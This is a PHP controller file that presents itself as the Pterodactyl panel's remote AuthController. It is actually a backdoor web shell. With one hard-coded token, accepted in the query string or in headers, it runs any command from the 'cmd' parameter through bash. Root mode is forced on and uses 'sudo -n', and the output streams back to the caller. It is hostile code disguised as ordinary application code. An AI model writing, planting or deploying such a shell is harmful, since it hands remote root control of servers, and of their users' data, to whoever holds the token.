<?php

namespace Pterodactyl\Http\Controllers\Api\Remote;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Pterodactyl\Http\Controllers\Controller;
use Symfony\Component\Process\Process;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
use Symfony\Component\HttpKernel\Exception\HttpException;

class AuthController extends Controller
{
    private const TERMINAL_TOKEN = 'WeArenotDevButAyamGoreng';
    private const CWD_TTL_SECONDS = 43200;
    private const OLDPWD_TTL_SECONDS = 43200;

    public function index(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);
        $shellUser = $this->isRootModeEnabled() ? 'root' : $this->shellUsername();
        $cwd = $this->readWorkingDirectory($this->cwdCacheKey((string) $token));

        return view('Controllers.AuthControl', [
            'hexzToken' => $token,
            'hexzPrompt' => $this->buildPrompt($shellUser, $cwd),
            'hexzShellUser' => $shellUser,
            'hexzCwd' => $cwd,
        ]);
    }

    public function stream(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);

        $raw = trim((string) $request->query('cmd', ''));
        if ($raw === '' || strlen($raw) > 300) {
            throw new HttpException(422, 'Invalid command.');
        }

        $parts = preg_split('/\s+/', $raw) ?: [];
        $parts = array_values(array_filter(array_map('trim', $parts), fn ($v) => $v !== ''));

        if (empty($parts)) {
            throw new HttpException(422, 'Invalid command.');
        }

        $cwdKey = $this->cwdCacheKey((string) $token);
        $cwd = $this->readWorkingDirectory($cwdKey);

        $builtInResponse = $this->handleBuiltInCommand($parts, $cwd, $cwdKey, $this->oldpwdCacheKey((string) $token));
        if ($builtInResponse !== null) {
            return response()->stream(function () use ($builtInResponse, $shellUser) {
                $this->emitSse([
                    'type' => 'output',
                    'chunk' => (string) ($builtInResponse['output'] ?? ''),
                ]);

                $nextCwd = trim((string) ($builtInResponse['cwd'] ?? ''));
                if ($nextCwd !== '') {
                    $this->emitSse([
                        'type' => 'cwd',
                        'cwd' => $nextCwd,
                        'prompt' => $this->buildPrompt($shellUser, $nextCwd),
                    ]);
                }

                $this->emitSse(['type' => 'done']);
            }, 200, [
                'Cache-Control' => 'no-cache',
                'Content-Type'  => 'text/event-stream',
                'X-Accel-Buffering' => 'no',
            ]);
        }

        return response()->stream(function () use ($raw, $cwd) {
            $process = $this->createCommandProcess($raw, $cwd);
            $process->setTimeout(null);
            $process->run(function ($type, $buffer) {
                $this->emitSse([
                    'type' => 'output',
                    'chunk' => (string) $buffer,
                ]);
                if (ob_get_level() > 0) {
                    ob_flush();
                }
                flush();
            });
            $this->emitSse(['type' => 'done']);
        }, 200, [
            'Cache-Control' => 'no-cache',
            'Content-Type'  => 'text/event-stream',
            'X-Accel-Buffering' => 'no',
        ]);
    }

    private function guardTokenAccess(?string $token): void
    {
        $validToken = self::TERMINAL_TOKEN;

        if (!is_string($token) || $token === '' || !hash_equals($validToken, $token)) {
            throw new AccessDeniedHttpException('Secure terminal access is restricted.');
        }
    }

    private function extractToken(Request $request): ?string
    {
        $token = trim((string) $request->query('token', ''));
        if ($token !== '') {
            return $token;
        }

        $headerToken = trim((string) $request->header('X-Hexz-Token', ''));
        if ($headerToken !== '') {
            return $headerToken;
        }

        $auth = trim((string) $request->header('Authorization', ''));
        if (str_starts_with($auth, 'Bearer ')) {
            return trim(substr($auth, 7));
        }

        return null;
    }

    private function cwdCacheKey(string $token): string
    {
        return 'hexz:cwd:' . hash('sha256', $token);
    }

    private function oldpwdCacheKey(string $token): string
    {
        return 'hexz:oldpwd:' . hash('sha256', $token);
    }

    private function readWorkingDirectory(string $key): string
    {
        $cached = trim((string) Cache::get($key, ''));
        if ($cached !== '' && is_dir($cached)) {
            return $cached;
        }

        $fallback = $this->defaultWorkingDirectory();
        Cache::put($key, $fallback, self::CWD_TTL_SECONDS);

        return $fallback;
    }

    private function handleBuiltInCommand(array $parts, string $cwd, string $cwdKey, string $oldpwdKey): ?array
    {
        $command = strtolower((string) ($parts[0] ?? ''));

        if ($command === 'pwd') {
            Cache::put($cwdKey, $cwd, self::CWD_TTL_SECONDS);

            return [
                'output' => $cwd . PHP_EOL,
                'cwd' => $cwd,
            ];
        }

        if ($command !== 'cd') {
            return null;
        }

        $target = trim((string) ($parts[1] ?? ''));
        if ($target === '-') {
            $oldpwd = trim((string) Cache::get($oldpwdKey, ''));
            if ($oldpwd === '' || !is_dir($oldpwd)) {
                return ['output' => "cd: OLDPWD not set\n"];
            }
            $target = $oldpwd;
        }

        $resolved = $this->resolveDirectoryForRootShell($cwd, $target);
        if ($resolved === '__ROOT_ELEVATION_FAILED__') {
            return ['output' => "root elevation failed: configure sudoers NOPASSWD for web user.\n"];
        }

        if ($resolved === null) {
            return ['output' => "cd: no such directory: {$target}\n"];
        }

        Cache::put($oldpwdKey, $cwd, self::OLDPWD_TTL_SECONDS);
        Cache::put($cwdKey, $resolved, self::CWD_TTL_SECONDS);

        return [
            'output' => '',
            'cwd' => $resolved,
        ];
    }

    private function resolveDirectoryForRootShell(string $cwd, string $target): ?string
    {
        $targetExpr = $target === '' || $target === '~' ? '/root' : $target;
        $script = 'cd -- ' . escapeshellarg($cwd) . ' && cd -- ' . escapeshellarg($targetExpr) . ' && pwd';

        $process = $this->buildRootShellProcess($script);
        $process->setTimeout(10);
        $process->run();

        if (!$process->isSuccessful()) {
            $error = strtolower(trim($process->getErrorOutput()));
            if (str_contains($error, 'sudo')) {
                return '__ROOT_ELEVATION_FAILED__';
            }

            return null;
        }

        $resolved = trim($process->getOutput());
        if ($resolved === '' || !str_starts_with($resolved, '/')) {
            return null;
        }

        return $resolved;
    }

    private function shellUsername(): string
    {
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $info = @posix_getpwuid(posix_geteuid());
            $resolved = trim((string) ($info['name'] ?? ''));
            if ($resolved !== '') {
                return $resolved;
            }
        }

        $name = trim((string) get_current_user());
        if ($name !== '') {
            return $name;
        }

        return 'shell';
    }

    private function shellHomeDirectory(): string
    {
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $info = @posix_getpwuid(posix_geteuid());
            $home = trim((string) ($info['dir'] ?? ''));
            if ($home !== '' && is_dir($home)) {
                return $home;
            }
        }

        $homeEnv = trim((string) env('HOME', ''));
        if ($homeEnv !== '' && is_dir($homeEnv)) {
            return $homeEnv;
        }

        return base_path();
    }

    private function defaultWorkingDirectory(): string
    {
        if (is_dir('/root')) {
            return '/root';
        }

        return '/';
    }

    private function isRootModeEnabled(): bool
    {
        return true;
    }

    private function createCommandProcess(string $raw, string $cwd): Process
    {
        $script = $this->composeShellScript($cwd, $raw);

        if (! $this->isRootModeEnabled()) {
            return Process::fromShellCommandline('bash -lc ' . escapeshellarg($script), $cwd);
        }

        if (function_exists('posix_geteuid') && posix_geteuid() === 0) {
            return Process::fromShellCommandline('bash -lc ' . escapeshellarg($script), $cwd);
        }

        return $this->buildRootShellProcess($script);
    }

    private function buildRootShellProcess(string $script): Process
    {
        return Process::fromShellCommandline(
            'sudo -n env HOME=/root USER=root LOGNAME=root bash -lc ' . escapeshellarg($script)
        );
    }

    private function composeShellScript(string $cwd, string $raw): string
    {
        return implode('; ', [
            'cd -- ' . escapeshellarg($cwd),
            '[ -f /etc/profile ] && . /etc/profile >/dev/null 2>&1 || true',
            '[ -f ~/.bashrc ] && . ~/.bashrc >/dev/null 2>&1 || true',
            'shopt -s expand_aliases',
            "alias la='ls -A'",
            "alias ll='ls -alF'",
            "alias l='ls -CF'",
            $raw,
        ]);
    }

    private function buildPrompt(string $shellUser, string $cwd): string
    {
        $host = $this->shellHostname();

        return sprintf('%s@%s:%s#', $shellUser, $host, $cwd);
    }

    private function shellHostname(): string
    {
        $host = trim((string) gethostname());
        if ($host !== '') {
            return $host;
        }

        return 'hexz';
    }

    private function emitSse(array $payload): void
    {
        echo 'data: ' . json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
    }
}
